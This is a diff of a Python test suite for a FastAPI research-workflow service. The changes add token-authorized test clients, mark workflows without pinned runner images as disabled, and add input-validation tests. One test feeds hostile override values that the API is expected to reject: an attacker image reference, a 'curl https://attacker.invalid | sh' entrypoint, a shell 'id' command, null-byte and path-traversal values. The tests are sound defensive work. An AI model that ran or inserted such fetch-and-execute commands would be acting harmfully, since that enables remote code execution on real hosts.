@@ -12,7 +12,9 @@ from datetime import datetime, timezone
 from hashlib import sha256
 from pathlib import Path
 
-from fastapi.testclient import TestClient
+import pytest
+
+from fastapi.testclient import TestClient as FastAPITestClient
 
 # Prevent stale ``app.*`` module state from leaking between test modules.
 # conftest.py sets up the import paths; each test file must also clear the
@@ -22,6 +24,7 @@ for module_name in list(sys.modules):
         del sys.modules[module_name]
 
 from app.config import Settings
+from app.auth import CallerPolicy
 import app.autoresearch as autoresearch_module
 import app.main as main_module
 import app.source_documents as source_documents
@@ -30,12 +33,70 @@ from app.schemas import AutoresearchDecisionRecord, AutoresearchIterationRecord,
 from app.stage_interpretation import build_interpretation_record_from_agent_draft, validate_interpretation_agent_draft
 from app.main import create_app
 from app.persistence import InMemoryRunStore
-from app.registry import WorkflowRegistry
+from app.registry import WorkflowRegistry as ProductionWorkflowRegistry
 
 REPO_ROOT = Path(__file__).resolve().parents[3]
+TEST_RUNNER_IMAGE = (
+    'ghcr.io/ccny-glasslab/glasslab-research-workspace-runner@sha256:'
+    'dae5bc4967f5ac54edb6c6d63d8d3db9e4652cc46e035118b0c456eb70121061'
+)
+WorkflowRegistry = ProductionWorkflowRegistry
 
 
-def build_client(artifacts_mount_path: Path | None = None) -> TestClient:
+class LegacyCompatibilityWorkflowRegistry(ProductionWorkflowRegistry):
+    """Exercise route/state behavior with an immutable executable test policy.
+
+    Production catalog tests use ``ProductionWorkflowRegistry`` directly. The
+    broader API suite is intentionally independent of whether historical
+    runner artifacts remain published.
+    """
+
+    def _load_entries(self):
+        entries = super()._load_entries()
+        for workflow_id, entry in entries.items():
+            if entry.execution_status == 'disabled':
+                entries[workflow_id] = type(entry).model_validate(
+                    {
+                        **entry.model_dump(mode='json'),
+                        'runner_image': TEST_RUNNER_IMAGE,
+                        'default_entrypoint': entry.default_entrypoint or ['python3', '-m', 'runner'],
+                        'execution_status': 'ready',
+                        'submission_backend': 'kubernetes',
+                        'execution_blockers': [],
+                        'max_wallclock_minutes': 240,
+                    }
+                )
+        return entries
+
+
+class TestClient(FastAPITestClient):
+    """Exercise existing route tests as an explicitly authorized caller."""
+
+    def __init__(self, app, **kwargs) -> None:
+        app.state.settings.caller_policies = (
+            CallerPolicy(
+                name='test-suite',
+                token='test-suite-token',
+                allowed_operations=frozenset(
+                    f'{method} {route.path_format}'
+                    for route in app.routes
+                    if hasattr(route, 'path_format') and hasattr(route, 'methods')
+                    for method in route.methods & {'GET', 'POST', 'PUT', 'PATCH', 'DELETE'}
+                ),
+            ),
+        )
+        headers = dict(kwargs.pop('headers', {}))
+        headers.setdefault('X-Glasslab-Caller', 'test-suite')
+        headers.setdefault('X-Glasslab-Workflow-Token', 'test-suite-token')
+        super().__init__(app, headers=headers, **kwargs)
+
+
+def build_client(
+    artifacts_mount_path: Path | None = None,
+    *,
+    submitter=None,
+    legacy_compatibility_registry: bool = False,
+) -> TestClient:
     # Tests that need on-disk artifacts pass a tmp_path; tests that only
     # exercise API routes and in-memory state skip it so the default
     # artifacts_mount_path is not set.
@@ -47,9 +108,27 @@ def build_client(artifacts_mount_path: Path | None = None) -> TestClient:
             else {}
         ),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry_class = (
+        LegacyCompatibilityWorkflowRegistry
+        if legacy_compatibility_registry
+        else ProductionWorkflowRegistry
+    )
+    registry = registry_class(settings.registry_dir)
     store = InMemoryRunStore()
-    return TestClient(create_app(settings=settings, registry=registry, store=store))
+    return TestClient(create_app(settings=settings, registry=registry, store=store, submitter=submitter))
+
+
+def build_legacy_compatibility_client(
+    artifacts_mount_path: Path | None = None,
+    *,
+    submitter=None,
+) -> TestClient:
+    """Use only for route/state coverage of intentionally disabled workflows."""
+    return build_client(
+        artifacts_mount_path,
+        submitter=submitter,
+        legacy_compatibility_registry=True,
+    )
 
 
 def test_healthz_and_workflow_families() -> None:
@@ -76,15 +155,15 @@ def test_healthz_and_workflow_families() -> None:
         'workspace-gpu-ml-v1',
     }
     by_id = {entry['workflow_id']: entry for entry in payload}
-    assert by_id['gpu-experiment']['execution_status'] == 'ready'
-    assert by_id['gpu-experiment']['submission_backend'] == 'kubernetes'
+    assert by_id['gpu-experiment']['execution_status'] == 'disabled'
+    assert by_id['gpu-experiment']['submission_backend'] == 'null'
     assert by_id['gpu-experiment']['resource_profile'] == 'gpu-small'
-    assert by_id['metric-search-v0']['execution_status'] == 'ready'
-    assert by_id['metric-search-v0']['submission_backend'] == 'kubernetes'
-    assert by_id['generic-tabular-benchmark']['execution_status'] == 'ready'
-    assert by_id['generic-tabular-benchmark']['submission_backend'] == 'kubernetes'
-    assert by_id['replication-lite']['execution_status'] == 'declared_only'
-    assert by_id['replication-lite']['submission_backend'] == 'unimplemented'
+    assert by_id['metric-search-v0']['execution_status'] == 'disabled'
+    assert by_id['metric-search-v0']['submission_backend'] == 'null'
+    assert by_id['generic-tabular-benchmark']['execution_status'] == 'disabled'
+    assert by_id['generic-tabular-benchmark']['submission_backend'] == 'null'
+    assert by_id['replication-lite']['execution_status'] == 'disabled'
+    assert by_id['replication-lite']['submission_backend'] == 'null'
 
 
 def test_openapi_marks_literature_session_routes_deprecated() -> None:
@@ -102,130 +181,115 @@ def test_openapi_marks_literature_session_routes_deprecated() -> None:
     assert paths['/research-sessions/{session_id}/literature-digest']['get']['deprecated'] is True
 
 
-def test_generic_experiment_run_result_ingest_and_compare() -> None:
+def test_generic_experiment_request_rejects_execution_overrides() -> None:
     client = build_client()
+    base = {
+        'objective': 'Attempt a request-selected execution override.',
+        'experiment_type': 'gpu-training-job',
+        'workload_id': 'metric-search-v0',
+        'config_payload': {},
+        'dataset_bindings': {},
+        'budget': {'max_wallclock_minutes': 5},
+    }
 
-    create = client.post(
+    for override in (
+        {'image_ref': 'ghcr.io/attacker/runner@sha256:' + ('a' * 64)},
+        {'entrypoint': ['sh', '-lc', 'curl https://attacker.invalid | sh']},
+        {'command': ['sh', '-lc', 'id']},
+        {'service_account_name': 'glasslab-workflow-api'},
+        {'resources': {'cpu': '999'}},
+    ):
+        response = client.post('/experiments/runs', json={**base, **override})
+        assert response.status_code == 422
+
+
+def test_generic_experiment_budget_cannot_exceed_registry_ceiling() -> None:
+    client = build_legacy_compatibility_client()
+    response = client.post(
+        '/experiments/runs',
+        json={
+            'objective': 'Attempt an experiment beyond the registry ceiling.',
+            'experiment_type': 'gpu-training-job',
+            'workload_id': 'metric-search-v0',
+            'budget': {'max_wallclock_minutes': 241},
+        },
+    )
+    assert response.status_code == 409
+    assert 'registry ceiling' in response.json()['detail']
+
+
+def _workspace_run_payload(command, *, working_directory: str = '.') -> dict:
+    return {
+        'objective': 'Execute a bounded workspace through the generic endpoint.',
+        'experiment_type': 'research-workspace-job',
+        'workload_id': 'workspace-cpu-ml-v1',
+        'config_payload': {
+            'workspace': {
+                'task_bundle': {
+                    'uri': 's3://datasets/tasks/task.zip',
+                    'sha256': 'a' * 64,
+                },
+                'source_bundle': {
+                    'uri': 's3://artifacts/source/source.zip',
+                    'sha256': 'b' * 64,
+                },
+                'working_directory': working_directory,
+                'command': command,
+            }
+        },
+        'budget': {'max_wallclock_minutes': 5},
+    }
+
+
+@pytest.mark.parametrize(
+    ('command', 'working_directory'),
+    [
+        (['sh', '-lc', 'python3 run.py'], '.'),
+        ('python3 run.py', '.'),
+        (['python3', 'run.py\x00'], '.'),
+        (['python3', 'run.py'], '../escape'),
+    ],
+)
+def test_generic_workspace_submission_rejects_unsafe_nested_command(
+    command,
+    working_directory: str,
+) -> None:
+    response = build_client().post(
+        '/experiments/runs',
+        json=_workspace_run_payload(command, working_directory=working_directory),
+    )
+    assert response.status_code == 422
+
+
+def test_generic_workspace_submission_persists_normalized_workspace() -> None:
+    response = build_client().post(
+        '/experiments/runs',
+        json=_workspace_run_payload(['python3', ' run.py ', '--seed', '17']),
+    )
+    assert response.status_code == 201
+    workspace = response.json()['manifest']['config_payload']['workspace']
+    assert workspace['command'] == ['python3', 'run.py', '--seed', '17']
+    assert workspace['working_directory'] == '.'
+    assert workspace['output_directory'] == '/outputs'
+    assert workspace['network_policy'] == 'none'
+
+
+def test_unpinned_metric_search_definition_is_discoverable_but_cannot_submit() -> None:
+    client = build_client()
+    response = client.post(
         '/experiments/runs',
         json={
             'objective': 'Run a bounded metric-search smoke job.',
             'experiment_type': 'gpu-training-job',
             'workload_id': 'metric-search-v0',
-            'entrypoint': [
-                'python3',
-                'scripts/run_experiment.py',
-                '--config',
-                'configs/search_spaces/art_metric_baseline.yaml',
-                '--output-dir',
-                '/mnt/artifacts/metric-search-smoke',
-            ],
             'config_payload': {'search_space_id': 'art-metric-baseline'},
             'dataset_bindings': {'train_uri': 's3://datasets/art/train.parquet'},
             'budget': {'max_epochs': 1, 'max_wallclock_minutes': 5},
             'submitted_by': 'test-suite',
         },
     )
-    assert create.status_code == 201
-    run_a = create.json()
-    assert run_a['workflow_id'] == 'metric-search-v0'
-    assert run_a['manifest']['experiment_type'] == 'gpu-training-job'
-    assert run_a['manifest']['workload_id'] == 'metric-search-v0'
-    assert run_a['manifest']['entrypoint'][0] == 'python3'
-
-    create_b = client.post(
-        '/experiments/runs',
-        json={
-            'objective': 'Run a second bounded metric-search smoke job.',
-            'experiment_type': 'gpu-training-job',
-            'workload_id': 'metric-search-v0',
-            'entrypoint': [
-                'python3',
-                'scripts/run_experiment.py',
-                '--config',
-                'configs/search_spaces/art_metric_proxy_v0.yaml',
-                '--output-dir',
-                '/mnt/artifacts/metric-search-smoke-b',
-            ],
-            'config_payload': {'search_space_id': 'art-metric-proxy-v0'},
-            'dataset_bindings': {'train_uri': 's3://datasets/art/train.parquet'},
-            'budget': {'max_epochs': 1, 'max_wallclock_minutes': 5},
-            'submitted_by': 'test-suite',
-        },
-    )
-    assert create_b.status_code == 201
-    run_b = create_b.json()
-
-    incomplete_ingest = client.post(
-        f"/experiments/runs/{run_a['run_id']}/results",
-        json={
-            'terminal_status': 'succeeded',
-            'metrics': {'composite_score': 0.61},
-            'artifact_refs': {'metrics.json': 's3://artifacts/run-a/metrics.json'},
-        },
-    )
-    assert incomplete_ingest.status_code == 409
-    assert incomplete_ingest.json()['detail']['message'] == 'successful result is missing required artifacts'
-
-    ingest_a = client.post(
-        f"/experiments/runs/{run_a['run_id']}/results",
-        json={
-            'terminal_status': 'succeeded',
-            'metrics': {'composite_score': 0.61, 'retrieval_recall_at_10': 0.72},
-            'artifact_refs': {
-                name: f's3://artifacts/run-a/{name}'
-                for name in [
-                    'run_manifest.json',
-                    'config.json',
-                    'metrics.json',
-                    'artifacts_index.json',
-                    'report.md',
-                    'status.json',
-                    'logs/',
-                ]
-            },
-            'runtime': {'node_name': 'node02'},
-        },
-    )
-    assert ingest_a.status_code == 200
-    assert ingest_a.json()['status']['status'] == 'succeeded'
-    assert ingest_a.json()['reported_metrics']['composite_score'] == 0.61
-
-    ingest_b = client.post(
-        f"/experiments/runs/{run_b['run_id']}/results",
-        json={
-            'terminal_status': 'succeeded',
-            'metrics': {'composite_score': 0.74, 'retrieval_recall_at_10': 0.81},
-            'artifact_refs': {
-                name: f's3://artifacts/run-b/{name}'
-                for name in [
-                    'run_manifest.json',
-                    'config.json',
-                    'metrics.json',
-                    'artifacts_index.json',
-                    'report.md',
-                    'status.json',
-                    'logs/',
-                ]
-            },
-            'runtime': {'node_name': 'node04'},
-        },
-    )
-    assert ingest_b.status_code == 200
-
-    compare = client.post(
-        '/experiments/compare',
-        json={
-            'run_ids': [run_a['run_id'], run_b['run_id']],
-            'metric_name': 'composite_score',
-            'higher_is_better': True,
-            'workload_id': 'metric-search-v0',
-        },
-    )
-    assert compare.status_code == 201
-    payload = compare.json()
-    assert payload['workload_id'] == 'metric-search-v0'
-    assert payload['summary_metrics']['metric_name'] == 'composite_score'
-    assert payload['summary_metrics']['best_run_id'] == run_b['run_id']
+    assert response.status_code == 409
+    assert 'Runner image digest is unavailable' in str(response.json()['detail'])
 
 
 def test_research_workspace_cannot_bypass_investigation_approval() -> None:
@@ -481,6 +545,13 @@ def test_confirmatory_investigation_freezes_workspace_plan_launches_run_and_reco
     assert launch_payload['run']['manifest']['dataset_bindings'] == {
         'adult_train': 's3://datasets/uci-adult/adult.data'
     }
+    policy = client.app.state.registry.get_workflow('research-workspace-cpu-v1')
+    assert policy is not None
+    assert launch_payload['run']['manifest']['runner_image'] == policy.runner_image
+    assert launch_payload['run']['manifest']['entrypoint'] == policy.default_entrypoint
+    assert launch_payload['run']['manifest']['resource_requests'] == policy.resource_profile.requests
+    assert launch_payload['run']['manifest']['resource_limits'] == policy.resource_profile.limits
+    assert launch_payload['run']['manifest']['runner_service_account_name'] == policy.runner_service_account_name
     assert [
         contract['name']
         for contract in launch_payload['run']['manifest']['config_payload']['dataset_contracts']
@@ -829,7 +900,7 @@ def test_session_source_document_ingest_bootstraps_intake_for_run(monkeypatch) -
     monkeypatch.setattr(
         source_documents,
         'fetch_source_document_bytes',
-        lambda source_url: (
+        lambda source_url, **kwargs: (
             b'<html><title>DreamSim</title><body>DreamSim uses contrastive loss with timm and torch.</body></html>',
             'text/html',
         ),
@@ -927,7 +998,7 @@ def test_session_intake_endpoint_accepts_note_dataset_and_source(monkeypatch) ->
     monkeypatch.setattr(
         source_documents,
         'fetch_source_document_bytes',
-        lambda source_url: (b'<html><title>Paper</title><body>bounded source</body></html>', 'text/html'),
+        lambda source_url, **kwargs: (b'<html><title>Paper</title><body>bounded source</body></html>', 'text/html'),
     )
     monkeypatch.setattr(
         source_documents,
@@ -1351,7 +1422,7 @@ def test_autoresearch_drafts_technique_catalog_variant(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -1417,7 +1488,7 @@ def test_gpu_autoresearch_launch_iteration_uses_allowed_runner_model(tmp_path) -
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -1469,7 +1540,7 @@ def test_gpu_autoresearch_launch_iteration_uses_allowed_runner_model(tmp_path) -
 
 
 def test_gpu_technique_card_can_fill_executable_contract() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     imported = client.post(
         '/technique-catalog/import',
@@ -2563,7 +2634,7 @@ def test_digest_schedule_lifecycle() -> None:
 
 
 def test_run_due_digest_schedules_creates_execution_record() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     create_run = client.post(
         '/runs',
@@ -2612,7 +2683,7 @@ def test_run_due_digest_schedules_creates_execution_record() -> None:
 
 
 def test_create_approved_rerun_schedule_from_latest_run() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     create_run = client.post(
         '/runs',
@@ -2660,7 +2731,7 @@ def test_create_approved_rerun_schedule_from_latest_run() -> None:
 
 
 def test_run_due_approved_rerun_schedules_creates_autonomous_run() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     create_run = client.post(
         '/runs',
@@ -2714,7 +2785,7 @@ def test_run_due_approved_rerun_schedules_resolves_source_status_from_disk(tmp_p
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -2767,7 +2838,7 @@ def test_run_due_approved_rerun_schedules_resolves_source_status_from_disk(tmp_p
 
 
 def test_approved_rerun_schedule_requires_succeeded_tier_two_run() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     created = client.post(
         '/runs',
@@ -2800,7 +2871,7 @@ def test_approved_rerun_schedule_requires_succeeded_tier_two_run() -> None:
 
 
 def test_create_run_from_latest_ready_design_draft() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     intake = client.post(
         '/intakes',
@@ -2822,6 +2893,33 @@ def test_create_run_from_latest_ready_design_draft() -> None:
     assert payload['source_intake_id'] == design_payload['intake_id']
     assert payload['run_purpose'] == 'validation'
     assert payload['manifest']['inputs']['dataset_name'] == 'titanic'
+
+
+def test_design_path_run_manifest_carries_registry_wallclock_budget() -> None:
+    # Regression test for #241: create_run_record was not populating budget,
+    # so every design-path submission shipped without activeDeadlineSeconds.
+    # LegacyCompatibilityWorkflowRegistry patches max_wallclock_minutes to 240
+    # for all workflows, so the resulting manifest must carry that ceiling.
+    client = build_legacy_compatibility_client()
+
+    intake = client.post(
+        '/intakes',
+        json={
+            'raw_request': 'Benchmark the approved models on Titanic and create a validation run.',
+            'notes': ['Use the standard Titanic train/test splits.'],
+        },
+    )
+    assert intake.status_code == 201
+
+    design = client.post('/design-drafts/from-latest-intake')
+    assert design.status_code == 201
+
+    run = client.post('/runs/from-latest-design-draft')
+    assert run.status_code == 201
+    payload = run.json()
+
+    budget = payload['manifest']['budget']
+    assert budget.get('max_wallclock_minutes') == 240
 
 
 def test_apply_latest_session_design_skill_is_not_shadowed_by_session_route() -> None:
@@ -2853,7 +2951,7 @@ def test_apply_latest_session_design_skill_is_not_shadowed_by_session_route() ->
 
 
 def test_get_latest_session_execution_preflight_uses_latest_session_design(monkeypatch) -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     class FakeResponse:
         def __init__(self, payload: dict) -> None:
@@ -2957,7 +3055,7 @@ def test_get_latest_session_execution_preflight_requires_session_design() -> Non
 
 
 def test_create_run_from_latest_session_design(monkeypatch) -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     class FakeResponse:
         def __init__(self, payload: dict) -> None:
@@ -3056,7 +3154,7 @@ def test_create_run_from_latest_session_design(monkeypatch) -> None:
 
 
 def test_transition_run_happy_path_creates_design_and_run(monkeypatch) -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     class FakeResponse:
         def __init__(self, payload: dict) -> None:
@@ -3169,7 +3267,7 @@ def test_create_run_from_latest_design_draft_blocks_non_ready_design() -> None:
 
 
 def test_create_run_from_reviewed_literature_design_draft() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     intake = client.post(
         '/intakes',
@@ -3227,7 +3325,7 @@ def test_interpretation_emits_bounded_method_spec() -> None:
 
 
 def test_design_from_interpretation_can_be_ready_for_run() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     intake = client.post(
         '/intakes',
@@ -3272,7 +3370,7 @@ def test_design_from_interpretation_can_be_ready_for_run() -> None:
 
 
 def test_gpu_technique_card_design_can_launch_run() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     imported = client.post(
         '/technique-catalog/import',
@@ -3323,7 +3421,7 @@ def test_gpu_technique_card_design_can_launch_run() -> None:
 
 
 def test_create_fresh_paper_pipeline_creates_literature_run_without_manual_review() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     response = client.post(
         '/paper-pipelines/fresh-paper',
@@ -5254,7 +5352,7 @@ def test_resolve_intake_agent_base_url_handles_normalize_endpoint() -> None:
 
 
 def test_create_run_success() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     response = client.post(
         '/runs',
@@ -5409,7 +5507,7 @@ def test_session_execution_preflight_flags_overfitting_split_risks() -> None:
     assert any('declared validation split: 0.2' in warning for warning in payload['warnings'])
 
 
-def test_declared_only_workflow_reports_not_executable() -> None:
+def test_disabled_replication_workflow_reports_not_executable() -> None:
     client = build_client()
 
     response = client.get('/workflow-families/replication-lite/execution-preflight')
@@ -5417,14 +5515,14 @@ def test_declared_only_workflow_reports_not_executable() -> None:
     assert response.status_code == 200
     payload = response.json()
     assert payload['workflow_id'] == 'replication-lite'
-    assert payload['execution_status'] == 'declared_only'
-    assert payload['submission_backend'] == 'unimplemented'
+    assert payload['execution_status'] == 'disabled'
+    assert payload['submission_backend'] == 'null'
     assert payload['ready'] is False
-    assert any('execution_status is declared_only' in issue for issue in payload['blocking_issues'])
-    assert any('submission_backend is unimplemented' in issue for issue in payload['blocking_issues'])
+    assert any('execution_status is disabled' in issue for issue in payload['blocking_issues'])
+    assert any('submission_backend is null' in issue for issue in payload['blocking_issues'])
 
 
-def test_gpu_workflow_execution_preflight_reports_gpu_contract() -> None:
+def test_disabled_gpu_workflow_preflight_preserves_declared_resource_contract() -> None:
     client = build_client()
 
     response = client.get('/workflow-families/gpu-experiment/execution-preflight')
@@ -5440,11 +5538,12 @@ def test_gpu_workflow_execution_preflight_reports_gpu_contract() -> None:
         'glasslab.io/gpu-candidate': 'true',
         'glasslab.io/gpu-vendor': 'nvidia',
     }
-    assert payload['execution_status'] == 'ready'
-    assert payload['submission_backend'] == 'kubernetes'
+    assert payload['execution_status'] == 'disabled'
+    assert payload['submission_backend'] == 'null'
     assert payload['runtime_requirements']['gpu'] is True
     assert 'computer_vision' in payload['runtime_requirements']['modalities']
-    assert payload['ready'] is True
+    assert payload['ready'] is False
+    assert any('Runner image digest is unavailable' in issue for issue in payload['blocking_issues'])
     assert any('preflight was skipped' in warning for warning in payload['warnings'])
     assert any('torch' in warning for warning in payload['warnings'])
 
@@ -5454,7 +5553,7 @@ def test_get_run_reflects_disk_artifacts_and_status(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -5504,7 +5603,7 @@ def test_autoresearch_campaign_happy_path(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -5627,7 +5726,7 @@ def test_autoresearch_decision_uses_best_metric_payload(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -5778,7 +5877,7 @@ def test_autoresearch_decision_recomputes_stale_escalation(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -5868,7 +5967,7 @@ def test_autoresearch_launch_next_iteration_synthesizes_follow_on_from_guidance(
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6074,7 +6173,7 @@ def test_session_autoresearch_transition_chain(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6146,7 +6245,7 @@ def test_transition_advance_autoresearch_bootstraps_campaign_and_launches_batch(
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6200,7 +6299,7 @@ def test_autoresearch_launch_iteration_uses_method_spec_inputs(tmp_path) -> None
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6249,7 +6348,7 @@ def test_autoresearch_launch_batch_returns_multiple_runs(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6308,7 +6407,7 @@ def test_autoresearch_decide_ready_batch_records_multiple_decisions(tmp_path) ->
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6384,7 +6483,7 @@ def test_autoresearch_summary_refreshes_completed_iteration_without_decide(tmp_p
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6483,7 +6582,7 @@ def test_autoresearch_notebook_draft_is_written(tmp_path) -> None:
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
         artifacts_mount_path=str(tmp_path),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6564,7 +6663,7 @@ def test_register_dataset_and_attach_to_session_context() -> None:
 
 
 def test_session_dataset_bootstraps_design_and_run() -> None:
-    client = build_client()
+    client = build_legacy_compatibility_client()
 
     session = client.post(
         '/research-sessions',
@@ -6636,7 +6735,7 @@ def test_autoresearch_notebook_refinement_falls_back_cleanly(tmp_path) -> None:
         artifacts_mount_path=str(tmp_path),
         coding_notebook_agent_enabled=False,
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6686,7 +6785,7 @@ def test_autoresearch_notebook_refinement_uses_coding_model_response(tmp_path, m
         coding_notebook_agent_url='http://example.invalid/api/chat',
         coding_notebook_model='qwen2.5-coder:14b',
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
     client = TestClient(create_app(settings=settings, registry=registry, store=store))
 
@@ -6794,7 +6893,7 @@ def test_run_status_route_returns_200_during_kube_outage() -> None:
     settings = Settings(
         registry_dir=str(REPO_ROOT / 'services' / 'workflow-registry' / 'definitions'),
     )
-    registry = WorkflowRegistry(settings.registry_dir)
+    registry = LegacyCompatibilityWorkflowRegistry(settings.registry_dir)
     store = InMemoryRunStore()
 
     class OutageSubmitter(NullJobSubmitter):
@@ -6818,7 +6917,6 @@ def test_run_status_route_returns_200_during_kube_outage() -> None:
             'objective': 'Observe a run during a Kubernetes outage.',
             'experiment_type': 'gpu-training-job',
             'workload_id': 'metric-search-v0',
-            'entrypoint': ['python3', 'scripts/run_experiment.py'],
             'config_payload': {'search_space_id': 'art-metric-baseline'},
             'dataset_bindings': {'train_uri': 's3://datasets/art/train.parquet'},
             'budget': {'max_epochs': 1, 'max_wallclock_minutes': 5},
@@ -6833,3 +6931,68 @@ def test_run_status_route_returns_200_during_kube_outage() -> None:
     status = got.json()['status']
     assert 'Live Kubernetes status unavailable' in status['detail']
     assert 'showing durable stored status' in status['detail']
+
+
+def test_cancel_run_confirms_submitter_before_persisting_cancelled() -> None:
+    class RecordingSubmitter(NullJobSubmitter):
+        def __init__(self) -> None:
+            super().__init__(namespace='default')
+            self.cancelled = []
+
+        def cancel_run(self, record) -> None:
+            self.cancelled.append(record.run_id)
+
+    submitter = RecordingSubmitter()
+    client = build_legacy_compatibility_client(submitter=submitter)
+    created = client.post(
+        '/experiments/runs',
+        json={
+            'objective': 'Cancel a bounded metric-search job.',
+            'experiment_type': 'gpu-training-job',
+            'workload_id': 'metric-search-v0',
+            'config_payload': {'search_space_id': 'art-metric-baseline'},
+            'dataset_bindings': {'train_uri': 's3://datasets/art/train.parquet'},
+            'budget': {'max_epochs': 1, 'max_wallclock_minutes': 5},
+            'submitted_by': 'test-suite',
+        },
+    )
